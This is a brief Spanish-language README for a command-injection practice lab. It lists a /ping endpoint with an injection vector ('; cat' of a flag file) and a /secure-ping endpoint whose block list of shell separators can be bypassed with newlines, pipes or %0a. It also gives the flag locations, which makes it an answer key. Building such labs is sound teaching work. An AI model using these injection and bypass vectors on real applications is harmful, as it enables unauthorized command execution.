# Lab cmd-injection

Room: **command-injection** (NUEVA — WebApp Pentesting).

## Endpoints

| URL | Filtro | Vector |
|---|---|---|
| `/ping?host=X` | Ninguno | `; cat /tmp/flags/flag1.txt` |
| `/secure-ping?host=X` | Bloquea `;` `&&` `\|\|` `` ` `` `$()` | Bypass con `\n`, `\|`, `%0a` |

## Flags
- `FLAG_1` — en /tmp/flags/flag1.txt (inyección básica)
- `FLAG_2` — en /etc/flag2_hidden (path más difícil)
- `FLAG_3` — en /tmp/flags/flag3_filtered.txt (bypass del filtro)
